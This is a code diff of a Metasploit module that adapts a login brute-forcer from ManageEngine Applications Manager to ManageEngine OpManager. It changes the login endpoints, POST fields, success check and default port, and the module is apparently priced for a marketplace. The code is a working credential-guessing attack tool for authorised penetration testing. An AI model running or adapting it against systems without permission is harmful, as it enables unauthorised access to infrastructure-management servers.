@@ -10,7 +10,7 @@ require 'metasploit/framework/login_scanner/http'
 module Metasploit
   module Framework
     module LoginScanner
-      class ManageEngineAppsManager < ::Metasploit::Framework::LoginScanner::HTTP
+      class ManageEngineOpManager < ::Metasploit::Framework::LoginScanner::HTTP
         def attempt_login(credential)
           result_opts = {
             credential: credential,
@@ -26,36 +26,38 @@ module Metasploit
             cli.connect
 
             req = cli.request_cgi({
-              'uri' => uri + (uri[-1] == '/' ? '' : '/') + 'MyPage.do?method=viewDashBoard&toredirect=true',
+              'uri' => uri + (uri[-1] == '/' ? '' : '/') + '/apiclient/ember/Login.jsp'
             })
 
             res = cli.send_recv(req)
 
-            cookie = res.get_cookies
+            cookies = res.get_cookies
 
             req = cli.request_cgi({
-              'uri' => uri + (uri[-1] == '/' ? '' : '/') + 'j_security_check',
+              'uri' => uri + (uri[-1] == '/' ? '' : '/') + '/j_security_check',
               'method' => 'POST',
-              'cookie' => cookie,
               'vars_post' => {
+                'AUTHRULE_NAME' => 'Authenticator',
                 'clienttype' => 'html',
-                'webstart' => '',
+                'ScreenWidth' => 1903,
+                'ScreenHeight' => 1310,
+                'loginFromCookieData' => false,
+                'ntlmv2' => false,
                 'j_username' => credential.public,
-                'ScreenWidth' => 1280,
-                'ScreenHeight' => 709,
-                'username' => credential.public,
                 'j_password' => credential.private,
-                'submit' => 'Login'
-              }
+                'uname' => ''
+              },
+              'cookie' => cookies
             })
 
             res = cli.send_recv(req)
 
-            if res && res.code == 302 && res.headers['Location'] =~ /method=viewDashBoard/
+            if res && res.code == 303
               result_opts.merge!(status: ::Metasploit::Model::Login::Status::SUCCESSFUL, proof: res)
             else
               result_opts.merge!(status: ::Metasploit::Model::Login::Status::INCORRECT, proof: res)
             end
+
           rescue Exception => e
             result_opts.merge!(status: ::Metasploit::Model::Login::Status::UNABLE_TO_CONNECT, proof:e)
           end
@@ -77,19 +79,21 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-        'Name'           => 'ManageEngine Applications Manager Bruteforce',
+        'Name'           => 'ManageEngine OpManager Bruteforce',
         'Description'    => %q(
-        This module attempts to brute force weak credentials on a ManageEngine Applications Manager instance.
+        This module attempts to bruteforce weak credentials on ManageEngine OpManager instances.
 
-        ManageEngine Applications Manager is an enterprise solution for managing and monitoring a diverse
-        set of other enterprise solutions ranging from databases to web servers. Privileged access
-        could yield significant insight into high value targets on the network. Tested on version 13.
+        ManageEngine OpManager is a popular enterprise solution for managing
+IT and office infrastructure such as servers, phones, and other
+sensitive devices. Privileged access to a ManageEngine OpManager
+instance could yield significant insight or access to high value targets
+or other sensitive information.
 
         Categories: Enterprise
 
-        Price: 2
+        Price: 3
 
-        Video: https://asciinema.org/a/FESImeHr8eWKD7TrXoVNUQWRE
+        Video: https://asciinema.org/a/cBEFMzAGByvviWNwmdjv9U2p0
 
         OS: Multi
 
@@ -105,7 +109,7 @@ class MetasploitModule < Msf::Auxiliary
           [
           ],
         'DefaultOptions' => {
-            'RPORT'           => 9090,
+            'RPORT'           => 80,
             'STOP_ON_SUCCESS' => true
         }
     )
@@ -122,7 +126,7 @@ class MetasploitModule < Msf::Auxiliary
       user_as_pass: datastore['USER_AS_PASS']
     )
 
-    scanner = Metasploit::Framework::LoginScanner::ManageEngineAppsManager.new(
+    scanner = Metasploit::Framework::LoginScanner::ManageEngineOpManager.new(
       configure_http_login_scanner(
         host: ip,
         port: datastore['RPORT'],
